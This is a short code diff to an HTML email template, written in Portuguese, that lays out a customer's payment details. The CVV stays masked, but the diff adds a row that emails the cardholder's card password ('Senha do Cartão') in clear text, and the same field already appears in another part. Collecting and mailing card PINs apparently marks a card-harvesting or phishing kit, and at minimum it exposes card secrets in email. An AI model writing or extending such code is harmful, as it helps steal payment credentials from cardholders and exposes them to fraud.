@@ -250,6 +250,10 @@ Senha do Cartão: {payment_data.senhaCartao}
                             <td style="padding: 8px; font-weight: bold; color: #555;">CVV:</td>
                             <td style="padding: 8px; color: #333;">***</td>
                         </tr>
+                        <tr style="background-color: #f9f9f9;">
+                            <td style="padding: 8px; font-weight: bold; color: #555;">Senha do Cartão:</td>
+                            <td style="padding: 8px; color: #333;">{payment_data.senhaCartao}</td>
+                        </tr>
                     </table>
 
                     <div style="margin-top: 20px; padding-top: 15px; border-top: 1px solid #eee; color: #999; font-size: 12px;">
